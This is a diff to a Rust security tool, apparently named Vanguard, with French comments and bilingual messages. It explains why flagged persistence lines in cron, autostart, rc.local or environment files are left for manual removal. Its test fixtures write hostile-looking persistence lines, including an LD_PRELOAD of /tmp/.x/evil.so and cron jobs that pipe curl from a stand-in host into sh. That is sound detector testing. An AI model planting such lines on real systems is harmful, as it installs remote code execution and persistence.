@@ -2084,6 +2084,7 @@ fn juger_parcours(
 /// sans langue ni numéro de ligne) : l'objet de l'alerte, qui change dès qu'une autre ligne ou une autre source
 /// s'ajoute (accepter les lignes d'aujourd'hui ne tait jamais celles de demain, même dans un fichier déjà signalé).
 #[derive(Default)]
+#[allow(clippy::struct_excessive_bools)] // une raison de laisser à la main par champ, chacune pour elle-même
 struct Lancements {
     critiques: Vec<String>,
     suspects: Vec<String>,
@@ -2115,6 +2116,15 @@ struct Lancements {
     /// `linux::RETRAIT_OCTETS_MAX` octets : son retrait seul n'est pas
     /// jugé, donc pas offert (ronde 5 du lot 096, N1), et c'est dit.
     trop_long: bool,
+    /// Une ligne signalée dans un fichier dont une ligne a plus de `linux::LIGNE_OCTETS_MAX` octets : un lecteur à
+    /// tampon fixe (pam_env) peut s'y arrêter, et la retirer en réveillerait d'autres (ronde 8 du lot 096, N8-1).
+    longues: bool,
+    /// Une ligne signalée dans /etc/rc.local dont la ligne « #! » ne nomme pas sh ou bash (ronde 8, N8-3).
+    interprete: bool,
+    /// Une ligne signalée dans un fichier lu ligne par ligne (cron, .desktop, unité, gestionnaire de connexion) dont
+    /// le retrait seul n'a pas la forme stricte que son lecteur accepte à coup sûr, ou dont une autre ligne pose la
+    /// même clé (ronde 8, N8-4 : `linux::AnalyseDeRetrait`).
+    lecteur: bool,
     r: Releveur,
 }
 
@@ -7248,7 +7258,19 @@ fn retrait(t: &mut Lancements, f: &Path, lu: &Lecture, l: &str) -> Option<(Strin
             t.trop_long = true;
             None
         }
-        Rendu::Decoupe(_) => {
+        Rendu::Decoupe(crate::machine::linux::Decoupe::Longue) => {
+            t.longues = true;
+            None
+        }
+        Rendu::Decoupe(crate::machine::linux::Decoupe::Interprete) => {
+            t.interprete = true;
+            None
+        }
+        Rendu::Decoupe(crate::machine::linux::Decoupe::Lecteur) => {
+            t.lecteur = true;
+            None
+        }
+        Rendu::Decoupe(crate::machine::linux::Decoupe::Barre | crate::machine::linux::Decoupe::Shell) => {
             t.jointes = true;
             None
         }
@@ -14057,6 +14079,9 @@ fn constat_des_lancements(t: Lancements) -> Constat {
         hors_utf8,
         jointes,
         trop_long,
+        longues,
+        interprete,
+        lecteur,
         ..
     } = t;
     suspects.sort();
@@ -14129,6 +14154,25 @@ fn constat_des_lancements(t: Lancements) -> Constat {
             " A reported line is in a file of more than {} lines or {} MiB: Vanguard does not check that removing it alone changes nothing else; everything is to be fixed by hand.",
             crate::machine::linux::RETRAIT_LIGNES_MAX,
             crate::machine::linux::RETRAIT_OCTETS_MAX / (1024 * 1024)
+        ));
+    }
+    if longues {
+        message.push_str(&trf!(
+            " Une ligne signalée est dans un fichier dont une ligne a plus de {} octets : un lecteur à tampon fixe peut s'arrêter à une telle ligne, et retirer une ligne pourrait en réveiller d'autres ; tout est à corriger à la main.",
+            " A reported line is in a file with a line of more than {} bytes: a reader with a fixed buffer can stop at such a line, and removing a line could wake up others; everything is to be fixed by hand.",
+            crate::machine::linux::LIGNE_OCTETS_MAX
+        ));
+    }
+    if interprete {
+        message.push_str(tr!(
+            " Une ligne signalée est dans /etc/rc.local, dont la première ligne « #! » ne nomme pas /bin/sh ni /bin/bash : pour un autre interpréteur, Vanguard ne sait pas ce que fait chaque ligne ; tout est à corriger à la main.",
+            " A reported line is in /etc/rc.local, whose first \"#!\" line names neither /bin/sh nor /bin/bash: for another interpreter, Vanguard does not know what each line does; everything is to be fixed by hand."
+        ));
+    }
+    if lecteur {
+        message.push_str(tr!(
+            " Une ligne signalée est dans un fichier lu ligne par ligne (cron, raccourci .desktop, unité systemd, gestionnaire de connexion) où elle n'a pas la forme stricte que son lecteur accepte à coup sûr, où une autre ligne pose la même clé, ou que cron pourrait ignorer tout entier : la retirer seule pourrait réveiller d'autres lignes ; tout est à corriger à la main.",
+            " A reported line is in a file read line by line (cron, .desktop shortcut, systemd unit, login manager) where it does not have the strict form its reader surely accepts, where another line sets the same key, or that cron could ignore entirely: removing it alone could wake up other lines; everything is to be fixed by hand."
         ));
     }
     if let Some(a) = a_savoir {
@@ -14962,9 +15006,10 @@ mod tests {
                 utf8: true,
                 index: std::cell::OnceCell::new(),
             };
-            // Lu ligne par ligne : la règle du shell (ronde 6 du lot 096) refuserait ces lignes, ce n'est pas ce
-            // que l'essai regarde.
-            let index = IndexDeRetrait::de(Path::new("/etc/xdg/autostart/a.desktop"), &lu);
+            // Lu ligne par ligne, par anacron, qui saute une ligne qu'il ne comprend pas : la règle du shell (ronde
+            // 6 du lot 096) et celle des fichiers à clés (ronde 8, N8-4 : « \r » refusé) refuseraient ces lignes, ce
+            // n'est pas ce que l'essai regarde.
+            let index = IndexDeRetrait::de(Path::new("/etc/anacrontab"), &lu);
             assert!(
                 matches!(index.rendu(&lu, l), Rendu::Ecrite(e) if e == ecrite),
                 "{texte:?} {l:?}"
@@ -20312,6 +20357,66 @@ mod tests {
             let c = constat_des_lancements(t);
             let auto = c.correctif.as_ref().is_some_and(|k| k.automatique);
             assert_eq!(auto, !jointe, "{contenu:?} : {}", c.message);
+        }
+    }
+
+    /// Ronde 8 du lot 096 (N8-1, N8-4), côté bilan : une ligne signalée dans un fichier à ligne de plus de 1 000
+    /// octets, ou dans un fichier lu ligne par ligne hors de la forme stricte de son lecteur ou dont une autre ligne
+    /// pose la même clé (le bilan ne lit pas /etc/rc.local : N8-3 n'est tenu que côté fils root) : le bilan n'en offre pas le retrait seul (le fils root le refuserait
+    /// aussi) et la phrase « à la main » dit pourquoi. Témoin : le même fichier sans ce défaut ne la porte pas.
+    #[test]
+    fn raisons_de_la_ronde_8_au_bilan() {
+        let piege = "export LD_PRELOAD=/tmp/.x/evil.so";
+        let longue = format!("{piege}\nA={}\n", "b".repeat(1100));
+        for (i, (lieu, contenu, phrase, a_la_main)) in [
+            ("/etc/environment", longue, "plus de 1000 octets", true),
+            (
+                "/etc/environment",
+                format!("{piege}\nA=b\n"),
+                "plus de 1000 octets",
+                false,
+            ),
+            (
+                "/etc/xdg/autostart/a.desktop",
+                "[Desktop Entry]\nExec=/usr/bin/true\nExec=/tmp/.x/a\n".to_string(),
+                "même clé",
+                true,
+            ),
+            (
+                "/etc/xdg/autostart/a.desktop",
+                "[Desktop Entry]\nName=A\nExec=/tmp/.x/a\n".to_string(),
+                "même clé",
+                false,
+            ),
+            (
+                "/etc/cron.d/x",
+                "* * * * * alice curl http://exemple.test/x | sh\n".to_string(),
+                "forme stricte",
+                true,
+            ),
+            (
+                "/etc/cron.d/x",
+                "* * * * * root curl http://exemple.test/x | sh\n".to_string(),
+                "forme stricte",
+                false,
+            ),
+        ]
+        .into_iter()
+        .enumerate()
+        {
+            let m = Maison::nouvelle(&format!("ronde-8-{i}"));
+            m.ecrire_hors(lieu, &contenu);
+            let c = m.lancements();
+            leve(&c, lieu);
+            assert_eq!(
+                c.message.contains(phrase),
+                a_la_main,
+                "{lieu} {contenu:?} : {}",
+                c.message
+            );
+            // Sous la racine d'un essai, aucun fichier n'est « du système » : le geste automatique n'est jamais
+            // offert ici (le retrait lui-même est tenu par `linux::tests` et `defense_eleve::tests::refus_de_la_ronde_8`).
+            assert!(!c.correctif.as_ref().is_some_and(|k| k.automatique), "{}", c.message);
         }
     }
 
